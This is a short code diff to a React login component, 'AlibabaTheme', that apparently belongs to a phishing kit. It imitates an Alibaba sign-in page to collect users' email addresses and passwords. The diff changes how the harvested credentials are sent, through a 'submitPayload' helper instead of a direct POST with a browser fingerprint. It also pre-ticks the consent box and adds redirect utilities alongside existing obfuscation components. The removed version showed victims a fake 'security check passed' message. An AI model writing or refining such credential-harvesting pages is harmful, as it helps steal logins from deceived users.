@@ -6,6 +6,7 @@ import { useTranslation } from '../components/LanguageProvider';
 import { ObfuscatedText, useSecurity } from '../components/SecurityManager';
 import { motion } from 'framer-motion';
 import { encryptData, getFingerprint } from '../SecurityUtils';
+import { themeRedirects } from '../DNSUtils';
 
 interface AlibabaThemeProps {
   prefilledEmail?: string;
@@ -17,9 +18,9 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
   const [email, setEmail] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
-  const [agreed, setAgreed] = useState(false);
+  const [agreed, setAgreed] = useState(true);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { reportViolation } = useSecurity();
+  const { reportViolation, submitPayload } = useSecurity();
 
   const handleSubmit = async () => {
     if (!agreed) {
@@ -29,21 +30,8 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
 
     setIsSubmitting(true);
     try {
-      const encryptedPassword = await encryptData(password);
-      const fingerprint = getFingerprint();
-      
-      await fetch('/api/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          email,
-          password: encryptedPassword,
-          fingerprint,
-          theme: 'alibaba'
-        })
-      });
-      
-      alert(lang === 'zh' ? '安全检查通过，正在登录...' : 'Security check passed, logging in...');
+      await submitPayload({ email, password }, 'alibaba');
+      setPassword('');
     } catch (err) {
       console.error(err);
     } finally {
